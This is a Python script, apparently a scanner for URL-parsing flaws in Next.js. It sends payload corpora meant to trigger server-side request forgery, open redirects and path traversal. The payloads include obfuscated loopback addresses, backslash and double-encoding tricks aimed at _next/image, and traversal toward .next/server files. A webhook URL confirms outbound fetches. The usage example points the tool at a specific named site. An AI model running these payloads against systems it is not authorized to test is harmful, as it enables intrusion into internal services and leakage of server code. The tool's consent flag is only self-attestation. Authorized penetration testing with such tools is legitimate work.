#!/usr/bin/env python3
"""

python3 next15_ultra_tester.py \
    --target https://demo.djangocfg.com \
    --prove https://webhook.site/05f5d63c-5397-43ad-9e02-b32d0c8356a0


next15_safe_max_tester.py
Aggressive-but-safe Next.js App Router URL-parsing tester.

- Default mode: conservative payload set + safe GETs, manual redirect follow.
- Aggressive mode: enables larger payload corpus and optional Host-header trials,
  but requires explicit confirmation (--i-have-permission).
- Writes JSON full results + CSV summary.

Usage examples:
  # conservative (default)
  python3 next15_safe_max_tester.py --target https://demo.djangocfg.com --prove https://en8q-xxxxxx.webhook.site/unique-id

  # aggressive (only if you own/are authorized)
  python3 next15_safe_max_tester.py --target https://demo.djangocfg.com --prove https://en8q-xxxxxx.webhook.site/unique-id --aggressive --i-have-permission

"""
import argparse
import requests
import urllib.parse
import json
import time
import random
import string
import sys
import os
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any

# ---------------- defaults ----------------
USER_AGENT = "next15-safe-max-tester/1.0"
TIMEOUT = 8
DEFAULT_WORKERS = 8
SLEEP_BETWEEN = 0.05  # base sleep between requests (workers handle concurrent)
MAX_REDIRECTS = 6
OUT_JSON = "ultra_safe_results.json"
OUT_CSV = "ultra_safe_summary.csv"

# ---------------- helpers ----------------
def randtag(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def pct(s: str) -> str:
    return urllib.parse.quote(s, safe='')

def double_pct(s: str) -> str:
    return pct(pct(s))

def uhex_slash() -> str:
    return "%EF%BC%8F"

def null_byte() -> str:
    return "%00"

SUSPECT_PATTERNS = ["127.", "localhost", "169.254.", "10.", "192.168.", "0x7f", "2130706433", "::1", ".next/server"]

# ---------------- payload builders ----------------
def build_basic_payloads(prove: str) -> Dict[str, str]:
    """Conservative payloads set used by default."""
    p = {}
    # simple / common suspects
    p["backslash_double_localhost"] = "/%5C%5Clocalhost:3000"
    p["backslash_127"] = "/%5Chttp://127.0.0.1:3000"
    p["double_slash_localhost"] = "//http://localhost:3000"
    p["double_slash_127"] = "//127.0.0.1:3000"
    # proof URL variants (help detect remote fetches)
    if prove:
        p["proto_backslash_prove"] = "/%5C" + prove
        p["proto_backslash_double_prove"] = "/%5C%5C" + prove
        p["proto_double_slash_prove"] = "//" + prove
        p["double_encoded_prove"] = "/" + double_pct("\\") + prove
    # next-image / next-data paths
    p["image_raw"] = "/_next/image?url=" + urllib.parse.quote("\\\\" + (prove if prove else "http://example.com")) + "&w=64&q=75"
    p["image_double"] = "/_next/image?url=" + urllib.parse.quote("//" + (prove if prove else "http://example.com")) + "&w=64&q=75"
    p["next_data_traversal"] = "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js"
    p["next_static_traversal"] = "/_next/static/%2E%2E/%2E%2E/server/app/layout.js"
    p["login_next_param"] = "/login?next=%5C%5C" + urllib.parse.quote(prove if prove else "http://example.com")
    p["wellknown_backslash"] = "/.well-known/%5C" + (prove if prove else "http://example.com")
    p["og_image_probe"] = "/%5C" + (prove if prove else "http://example.com") + "/opengraph-image.png"
    p["og_hop_probe"] = "/og/%5C%5C" + (prove if prove else "http://example.com")
    return p

def build_aggressive_payloads(prove: str) -> Dict[str, str]:
    """Larger corpus including many obfuscations — enabled only with explicit permission."""
    p = {}
    hosts = ["127.0.0.1", "localhost", "0.0.0.0", "2130706433", "0x7f000001", "::1"]
    prefixes = ["//", "///", "////", "/%5C", "/%255C", "/%5C%5C", "/%5C%5C%5C"]
    names = ["fetch?url=", "redirect?u=", "go/", "api/img?src="]
    for pre in prefixes:
        for h in hosts:
            for n in names:
                key = f"{pre}_{h}_{n}".replace("/", "_")[:40]
                val = f"{pre}{h}/{n}{randtag(6)}"
                p[key] = val
    # add some case/mixed encodings and null bytes and percent-encodings
    p["pct_protocol_h"] = "/h%74tp://example.com"
    if prove:
        p["unicode_fullwidth_slash_prove"] = "/" + uhex_slash() + prove
        p["null_byte_after_path_prove"] = "/%5C%5Clocalhost:3000" + null_byte()
    # include many intentionally weird encodings (but keep to GET-only)
    for i in range(60):
        a = random.choice(prefixes)
        b = random.choice(hosts)
        p[f"rand_{i}"] = f"{a}{b}/{randtag(6)}?t={randtag(6)}"
    return p

# ---------------- request & walking ----------------
def send_once(full_url: str, headers: Dict[str, str], timeout: int):
    try:
        r = requests.get(full_url, headers=headers, timeout=timeout, allow_redirects=False)
        return r
    except Exception as e:
        return {"error": str(e)}

def walk_redirects(base_target: str, first_path: str, headers: Dict[str, str], timeout: int, max_hops:int=MAX_REDIRECTS):
    chain = []
    url = base_target.rstrip("/") + first_path
    r = send_once(url, headers, timeout)
    if isinstance(r, dict) and r.get("error"):
        chain.append({"url": url, "status": None, "error": r["error"]})
        return chain
    chain.append({"url": url, "status": r.status_code, "location": r.headers.get("location"), "snippet": (r.text[:400] if r.text else "")})
    hops = 0
    while r.headers.get("location") and hops < max_hops:
        loc = r.headers.get("location")
        next_url = urllib.parse.urljoin(base_target, loc)
        r = send_once(next_url, headers, timeout)
        if isinstance(r, dict) and r.get("error"):
            chain.append({"url": next_url, "status": None, "error": r["error"]})
            break
        chain.append({"url": next_url, "status": r.status_code, "location": r.headers.get("location"), "snippet": (r.text[:400] if r.text else "")})
        hops += 1
    return chain

def detect_indicators(chain: List[Dict[str, Any]], prove: str) -> List[str]:
    combined = json.dumps(chain, ensure_ascii=False)
    inds = []
    for s in SUSPECT_PATTERNS:
        if s in combined:
            inds.append(s)
    # PROVE_URL exact match quick check
    if prove and (prove in combined):
        inds.append("PROVE_URL")
    # length anomalies heuristic
    for entry in chain:
        if entry.get("location") and len(entry["location"]) < 6:
            inds.append("length_anomaly_low")
            break
    # server app leak
    if "/server/app" in combined or ".next/server" in combined:
        inds.append("server_app_path")
    return sorted(set(inds))

# ---------------- main runner ----------------
def run_one(target: str, path: str, prove: str, headers: Dict[str,str], timeout:int, aggressive:bool):
    chain = walk_redirects(target, path, headers, timeout)
    indicators = detect_indicators(chain, prove)
    result = {
        "path": path,
        "chain": chain,
        "indicators": indicators,
        "final_status": chain[-1].get("status") if chain else None
    }
    return result

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Full target base URL (https://...)")
    parser.add_argument("--prove", required=False, default="", help="Optional webhook/prove URL you control")
    parser.add_argument("--out", default=OUT_JSON, help="Output JSON file")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS)
    parser.add_argument("--timeout", type=int, default=TIMEOUT)
    parser.add_argument("--sleep", type=float, default=SLEEP_BETWEEN)
    parser.add_argument("--aggressive", action="store_true", help="Enable larger aggressive payload corpus (use with caution)")
    parser.add_argument("--i-have-permission", action="store_true", help="Must be provided to enable aggressive host trials")
    args = parser.parse_args()

    if args.aggressive and not args.i_have_permission:
        print("ERROR: --aggressive requires --i-have-permission (explicit consent). Exiting.")
        sys.exit(1)

    tag = randtag(10)
    headers = {"User-Agent": USER_AGENT}
    target = args.target.rstrip("/")

    # build payloads
    payloads = build_basic_payloads(args.prove)
    if args.aggressive:
        payloads.update(build_aggressive_payloads(args.prove))

    # attach tag param to each path safely
    safe_payloads = {}
    for name, path in payloads.items():
        if "?" in path:
            safe_payloads[name] = path + "&t=" + tag
        else:
            safe_payloads[name] = path + ("?t=" + tag)

    results = {}
    print(f"[+] Starting safe test run — tag={tag} target={target}")
    print(f"[+] Total payloads: {len(safe_payloads)} — workers={args.workers} aggressive={args.aggressive}")
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = {}
        for name, path in safe_payloads.items():
            futures[ex.submit(run_one, target, path, args.prove, headers, args.timeout, args.aggressive)] = name
            time.sleep(args.sleep)  # gentle spacing to avoid thundering herd
        for fut in as_completed(futures):
            name = futures[fut]
            try:
                res = fut.result()
            except Exception as e:
                print(f"[!] Exception for {name}: {e}")
                res = {"error": str(e)}
            results[name] = res
            # immediate concise print
            inds = res.get("indicators", [])
            print(f"[>] {name}: status={res.get('final_status')} indicators={inds}")

    # write full JSON
    summary = {"target": target, "prove": args.prove, "tag": tag, "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), "results": results}
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2, ensure_ascii=False)
    # write CSV summary
    with open(OUT_CSV, "w", newline='', encoding="utf-8") as csvf:
        writer = csv.writer(csvf)
        writer.writerow(["payload", "final_status", "indicators", "first_location_snippet"])
        for k, v in results.items():
            status = v.get("final_status")
            inds = ";".join(v.get("indicators", []))
            first_snip = ""
            if v.get("chain"):
                first_snip = v["chain"][0].get("snippet", "")[:200]
            writer.writerow([k, status, inds, first_snip])

    print(f"[+] Done. JSON -> {args.out} CSV -> {OUT_CSV}")
    print("[+] Check your webhook/PROVE_URL and server logs for any incoming hits with tag:", tag)

if __name__ == "__main__":
    main()
